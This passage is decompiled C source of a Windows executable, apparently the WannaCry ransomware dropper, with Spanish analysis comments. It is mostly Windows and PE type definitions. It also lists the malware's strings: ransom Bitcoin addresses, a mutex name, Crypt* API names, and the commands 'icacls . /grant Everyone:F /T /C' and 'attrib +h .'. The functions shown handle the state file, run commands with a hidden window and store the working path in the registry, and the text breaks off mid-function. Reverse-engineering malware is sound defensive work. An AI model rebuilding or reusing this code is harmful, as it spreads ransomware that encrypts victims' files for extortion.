/*
 * Codigo descompilado para analisis estatico. Los identificadores FUN_*,
 * DAT_* y varios tipos fueron inferidos por la herramienta; los comentarios
 * describen el comportamiento observable y no garantizan firmas originales.
 */
typedef unsigned char   undefined;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef short    wchar_t;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    void *pVFTable;
    void *spare;
    char name[0];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor *pType;
    ptrdiff_t dispCatchObj;
    void *addressOfHandler;
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef int __ehstate_t;

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (*action)(void);
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory:31;
    dword DataIsDirectory:1;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType *pHandlerArray;
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_FuncInfo FuncInfo;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry *pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry *pTryBlockMap;
    uint nIPMapEntries;
    void *pIPToStateMap;
};

typedef struct SC_HANDLE__ SC_HANDLE__, *PSC_HANDLE__;

typedef struct SC_HANDLE__ *SC_HANDLE;

struct SC_HANDLE__ {
    int unused;
};

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef ulong DWORD;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef ushort WORD;

typedef uchar BYTE;

typedef BYTE *LPBYTE;

typedef void *HANDLE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef void *LPVOID;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef ulong ULONG_PTR;

typedef union _union_518 _union_518, *P_union_518;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

typedef struct _SYSTEMTIME SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _PROCESS_INFORMATION *LPPROCESS_INFORMATION;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef long LONG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef wchar_t WCHAR;

typedef CHAR *LPCSTR;

typedef LONG *PLONG;

typedef union _LARGE_INTEGER _LARGE_INTEGER, *P_LARGE_INTEGER;

typedef struct _struct_19 _struct_19, *P_struct_19;

typedef struct _struct_20 _struct_20, *P_struct_20;

typedef double LONGLONG;

struct _struct_20 {
    DWORD LowPart;
    LONG HighPart;
};

struct _struct_19 {
    DWORD LowPart;
    LONG HighPart;
};

union _LARGE_INTEGER {
    struct _struct_19 s;
    struct _struct_20 u;
    LONGLONG QuadPart;
};

typedef union _LARGE_INTEGER LARGE_INTEGER;

typedef LARGE_INTEGER *PLARGE_INTEGER;

typedef WCHAR *LPWSTR;

typedef CONTEXT *PCONTEXT;

typedef WCHAR *LPCWSTR;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ULONG_PTR HCRYPTPROV;

typedef uint UINT_PTR;

typedef ULONG_PTR SIZE_T;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME *LPFILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

typedef int (*FARPROC)(void);

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef DWORD *LPDWORD;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef DWORD *PDWORD;

typedef struct _FILETIME FILETIME;

typedef HANDLE HGLOBAL;

typedef struct HINSTANCE__ *HINSTANCE;

typedef void *LPCVOID;

typedef struct HRSRC__ HRSRC__, *PHRSRC__;

typedef struct HRSRC__ *HRSRC;

struct HRSRC__ {
    int unused;
};

typedef HINSTANCE HMODULE;

typedef uint UINT;

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct Var Var, *PVar;

struct Var {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset:31;
    dword NameIsString:1;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef struct StringFileInfo StringFileInfo, *PStringFileInfo;

struct StringFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

struct IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct StringTable StringTable, *PStringTable;

struct StringTable {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct VS_VERSION_INFO VS_VERSION_INFO, *PVS_VERSION_INFO;

struct VS_VERSION_INFO {
    word StructLength;
    word ValueLength;
    word StructType;
    wchar16 Info[16];
    byte Padding[2];
    dword Signature;
    word StructVersion[2];
    word FileVersion[4];
    word ProductVersion[4];
    dword FileFlagsMask[2];
    dword FileFlags;
    dword FileOS;
    dword FileType;
    dword FileSubtype;
    dword FileTimestamp;
};

typedef struct IMAGE_RESOURCE_DIR_STRING_U_6 IMAGE_RESOURCE_DIR_STRING_U_6, *PIMAGE_RESOURCE_DIR_STRING_U_6;

struct IMAGE_RESOURCE_DIR_STRING_U_6 {
    word Length;
    wchar16 NameString[3];
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct VarFileInfo VarFileInfo, *PVarFileInfo;

struct VarFileInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct StringInfo StringInfo, *PStringInfo;

struct StringInfo {
    word wLength;
    word wValueLength;
    word wType;
};

typedef struct _iobuf _iobuf, *P_iobuf;

struct _iobuf {
    char *_ptr;
    int _cnt;
    char *_base;
    int _flag;
    int _file;
    int _charbuf;
    int _bufsiz;
    char *_tmpfname;
};

typedef struct _iobuf FILE;

typedef void (*PMFN)(void *);

typedef struct _s_CatchableType _s_CatchableType, *P_s_CatchableType;


// WARNING! conflicting data type names: /ehdata.h/TypeDescriptor - /TypeDescriptor

typedef struct PMD PMD, *PPMD;

struct PMD {
    ptrdiff_t mdisp;
    ptrdiff_t pdisp;
    ptrdiff_t vdisp;
};

struct _s_CatchableType {
    uint properties;
    struct TypeDescriptor *pType;
    struct PMD thisDisplacement;
    int sizeOrOffset;
    PMFN copyFunction;
};

typedef struct _s_CatchableType CatchableType;

typedef struct _s_CatchableTypeArray _s_CatchableTypeArray, *P_s_CatchableTypeArray;

typedef struct _s_CatchableTypeArray CatchableTypeArray;

struct _s_CatchableTypeArray {
    int nCatchableTypes;
    CatchableType *arrayOfCatchableTypes[0];
};

typedef struct _s_ThrowInfo _s_ThrowInfo, *P_s_ThrowInfo;

typedef struct _s_ThrowInfo ThrowInfo;

struct _s_ThrowInfo {
    uint attributes;
    PMFN pmfnUnwind;
    int (*pForwardCompat)(void);
    CatchableTypeArray *pCatchableTypeArray;
};

typedef LONG LSTATUS;

typedef struct exception exception, *Pexception;

struct exception { // PlaceHolder Structure
};

typedef struct type_info type_info, *Ptype_info;

struct type_info { // PlaceHolder Structure
};

typedef uint size_t;

typedef struct _startupinfo _startupinfo, *P_startupinfo;

struct _startupinfo {
    int newmode;
};



string s_c.wnry_0040e010;
undefined DAT_0040e018;
undefined DAT_0040e01c;
undefined DAT_0040e030;
undefined4 DAT_0040e04c;
undefined DAT_80000001;
undefined DAT_80000002;
undefined *_Source_0040e034;
WCHAR DAT_0040f874;
pointer PTR_FUN_004081d8;
void *ExceptionList;
undefined *DAT_0040f880;
undefined *PTR_DAT_0040f578;
undefined DAT_004076f4;
undefined DAT_004081e0;
string s_WANACRY!_0040eb7c;
FARPROC DAT_0040f878;
FARPROC DAT_0040f87c;
FARPROC DAT_0040f880;
FARPROC DAT_0040f884;
FARPROC DAT_0040f888;
FARPROC DAT_0040f88c;
undefined DAT_0040f890;
string s_CloseHandle_0040eb94;
string s_DeleteFileW_0040eba0;
string s_MoveFileExW_0040ebac;
string s_MoveFileW_0040ebb8;
string s_ReadFile_0040ebc4;
string s_WriteFile_0040ebd0;
string s_CreateFileW_0040ebdc;
string s_kernel32.dll_0040ebe8;
pointer PTR_FUN_004081ec;
undefined *DAT_0040f894;
undefined *DAT_0040f898;
undefined DAT_0040ebf8;
undefined *DAT_0040f89c;
undefined DAT_004081f0;
undefined *DAT_0040f8a4;
FARPROC DAT_0040f894;
FARPROC DAT_0040f898;
FARPROC DAT_0040f89c;
FARPROC DAT_0040f8a0;
FARPROC DAT_0040f8a4;
undefined DAT_0040f8a8;
string s_advapi32.dll_0040e020;
string s_CryptGenKey_0040f0c4;
string s_CryptDecrypt_0040f0d0;
string s_CryptEncrypt_0040f0e0;
string s_CryptDestroyKey_0040f0f0;
string s_CryptImportKey_0040f100;
string s_CryptAcquireContextA_0040f110;
LPCSTR lpMultiByteStr_0040f8ac;
string s_cmd.exe_/c_"%s"_0040f42c;
undefined DAT_0000080a;
LPCSTR lpType_0040f43c;
string s_115p7UMMngoj1pMvkpHijcRdfJNXj6Lr_0040f440;
string s_12t9YDPgwueZ9NyMgw519p7AA8isjr6S_0040f464;
string s_13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb_0040f488;
string s_Global\MsWinZonesCacheCounterMut_0040f4b4;
char *_Format_0040f4ac;
CHAR DAT_0040f910;
string s_tasksche.exe_0040f4d8;
char *_Str2_0040f538;
string s_TaskStart_0040f4e8;
string s_t.wnry_0040f4f4;
string s_icacls_._/grant_Everyone:F_/T_/C_0040f4fc;
string s_attrib_+h_._0040f520;
undefined LAB_0040216e;
undefined LAB_00402185;
undefined LAB_004021a3;
string s_GetNativeSystemInfo_0040f55c;
undefined DAT_0040f53c;
undefined *PTR_FUN_0040bc7c;
undefined DAT_004089fc;
undefined DAT_0040abfc;
undefined DAT_0040affc;
ThrowInfo *pThrowInfo_0040d570;
undefined DAT_0040b3fc;
undefined DAT_0040b7fc;
undefined1 DAT_0040bbfc;
undefined DAT_0040f57c;
undefined DAT_00408bfc;
pointer this_0040f570;
undefined DAT_00408ffc;
undefined DAT_004093fc;
undefined DAT_004097fc;
undefined DAT_00408afc;
undefined DAT_00409bfc;
undefined DAT_00409ffc;
undefined DAT_0040a3fc;
undefined DAT_0040a7fc;
undefined DAT_0040bc24;
undefined DAT_0040bc2c;
undefined DAT_0040bc34;
undefined DAT_0040bc28;
undefined DAT_0040bc30;
undefined DAT_0040bc38;
pointer PTR_DAT_0040f574;
undefined DAT_0040bca8;
string s_invalid_distance_code_0040f618;
string s_invalid_literal/length_code_0040f630;
undefined DAT_0040cdf0;
string s_invalid_bit_length_repeat_0040f64c;
string s_too_many_length_or_distance_symb_0040f668;
string s_invalid_stored_block_lengths_0040f68c;
string s_invalid_block_type_0040f6ac;
pointer switchdataD_00404bbd;
string s_incomplete_dynamic_bit_lengths_t_0040f6c0;
string s_oversubscribed_dynamic_bit_lengt_0040f6e4;
string s_incomplete_literal/length_tree_0040f70c;
string s_oversubscribed_literal/length_tr_0040f72c;
string s_empty_distance_tree_with_lengths_0040f750;
string s_incomplete_distance_tree_0040f774;
string s_oversubscribed_distance_tree_0040f790;
undefined DAT_0040bcf0;
undefined DAT_0040ccf0;
undefined DAT_0040d054;
undefined LAB_004056ee;
undefined FUN_004056dd;
string s_need_dictionary_0040f608;
string s_incorrect_data_check_0040f7b8;
string s_incorrect_header_check_0040f7d0;
string s_invalid_window_size_0040f7e8;
string s_unknown_compression_method_0040f7fc;
char *_Source_0040f818;
char *_Str2_0040f81c;
uchar *_Substr_0040f838;
uchar *_Substr_0040f830;
uchar *_Substr_0040f828;
uchar *_Substr_0040f820;
string s_%s%s%s_0040f848;
LPCSTR param_2_0040f840;
int *DAT_0040f938;
undefined4 DAT_0040f938;
int DAT_0040f938;
undefined DAT_0040f94c;
undefined DAT_0040f950;
undefined4 DAT_0040f948;
undefined4 DAT_0040f944;
undefined *PTR__adjust_fdiv_004081b8;
undefined DAT_0040f954;
int DAT_0040f870;
int DAT_0040f940;
undefined *PTR__acmdln_004081a8;
undefined LAB_0040793c;
undefined DAT_0040d488;
undefined DAT_0040e000;
undefined DAT_0040e004;
undefined DAT_0040e008;
undefined DAT_0040e00c;
int _DoWildCard_0040f93c;

/* Guarda o recupera un bloque fijo de estado en c.wnry. */
bool __cdecl FUN_00401000(void *param_1,int param_2)

{
  FILE *_File;
  size_t sVar1;
  bool bVar2;
  char *_Mode;
  
  if (param_2 == 0) {
    _Mode = &DAT_0040e018;
  }
  else {
    _Mode = &DAT_0040e01c;
  }
  _File = fopen(s_c_wnry_0040e010,_Mode);
  if (_File == (FILE *)0x0) {
    bVar2 = false;
  }
  else {
    if (param_2 == 0) {
      sVar1 = fwrite(param_1,0x30c,1,_File);
    }
    else {
      sVar1 = fread(param_1,0x30c,1,_File);
    }
    bVar2 = sVar1 != 0;
    fclose(_File);
  }
  return bVar2;
}



/* Ejecuta un comando, oculta su ventana y opcionalmente espera su finalizacion. */
undefined4 __cdecl FUN_00401064(LPSTR param_1,DWORD param_2,LPDWORD param_3)

{
  BOOL BVar1;
  DWORD DVar2;
  undefined4 uVar3;
  int iVar4;
  LPSTR *ppCVar5;
  _STARTUPINFOA local_58;
  _PROCESS_INFORMATION local_14;
  
  local_58.cb = 0x44;
  ppCVar5 = &local_58.lpReserved;
  for (iVar4 = 0x10; iVar4 != 0; iVar4 = iVar4 + -1) {
    *ppCVar5 = (LPSTR)0x0;
    ppCVar5 = ppCVar5 + 1;
  }
  local_14.hProcess = (HANDLE)0x0;
  local_14.hThread = (HANDLE)0x0;
  local_14.dwProcessId = 0;
  local_14.dwThreadId = 0;
  uVar3 = 1;
  local_58.wShowWindow = 0;
  local_58.dwFlags = 1;
  BVar1 = CreateProcessA((LPCSTR)0x0,param_1,(LPSECURITY_ATTRIBUTES)0x0,(LPSECURITY_ATTRIBUTES)0x0,0
                         ,0x8000000,(LPVOID)0x0,(LPCSTR)0x0,&local_58,&local_14);
  if (BVar1 == 0) {
    uVar3 = 0;
  }
  else {
    if (param_2 != 0) {
      DVar2 = WaitForSingleObject(local_14.hProcess,param_2);
      if (DVar2 != 0) {
        TerminateProcess(local_14.hProcess,0xffffffff);
      }
      if (param_3 != (LPDWORD)0x0) {
        GetExitCodeProcess(local_14.hProcess,param_3);
      }
    }
    CloseHandle(local_14.hProcess);
    CloseHandle(local_14.hThread);
  }
  return uVar3;
}



/* Lee o escribe en el registro la ruta de trabajo del programa. */
undefined4 __cdecl FUN_004010fd(int param_1)

{
  size_t sVar1;
  LSTATUS LVar2;
  int iVar3;
  undefined4 *puVar4;
  wchar_t *pwVar5;
  bool bVar6;
  HKEY hKey;
  BYTE local_2e0;
  undefined4 local_2df;
  wchar_t local_d8 [10];
  undefined4 local_c4 [45];
  DWORD local_10;
  int local_c;
  HKEY local_8;
  
  puVar4 = &DAT_0040e04c;
  pwVar5 = local_d8;
  for (iVar3 = 5; iVar3 != 0; iVar3 = iVar3 + -1) {
    *(undefined4 *)pwVar5 = *puVar4;
    puVar4 = puVar4 + 1;
    pwVar5 = pwVar5 + 2;
  }
  local_2e0 = '\0';
  local_8 = (HKEY)0x0;
  puVar4 = local_c4;
  for (iVar3 = 0x2d; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  puVar4 = &local_2df;
  for (iVar3 = 0x81; iVar3 != 0; iVar3 = iVar3 + -1) {
    *puVar4 = 0;
    puVar4 = puVar4 + 1;
  }
  *(undefined2 *)puVar4 = 0;
  *(undefined1 *)((int)puVar4 + 2) = 0;
  wcscat(local_d8,(wchar_t *)&_Source_0040e034);
  local_c = 0;
  do {
    if (local_c == 0) {
      hKey = (HKEY)&DAT_80000002;
    }
    else {
      hKey = (HKEY)&hKey_80000001;
    }
    RegCreateKeyW(hKey,local_d8,&local_8);
    if (local_8 != (HKEY)0x0) {
      if (param_1 == 0) {
        local_10 = 0x207;
        LVar2 = RegQueryValueExA(local_8,&DAT_0040e030,(LPDWORD)0x0,(LPDWORD)0x0,&local_2e0,
                                 &local_10);
        bVar6 = LVar2 == 0;
        if (bVar6) {
          SetCurrentDirectoryA((LPCSTR)&local_2e0);
        }
      }
      else {
        GetCurrentDirectoryA(0x207,(LPSTR)&local_2e0);
        sVar1 = strlen((char *)&local_2e0);
        LVar2 = RegSetValueExA(local_8,&DAT_0040e030,0,1,&local_2e0,sVar1 + 1);
        bVar6 = LVar2 == 0;
      }
      RegCloseKey(local_8);
      if (bVar6) {
        return 1;
      }
    }
    local_c = local_c + 1;
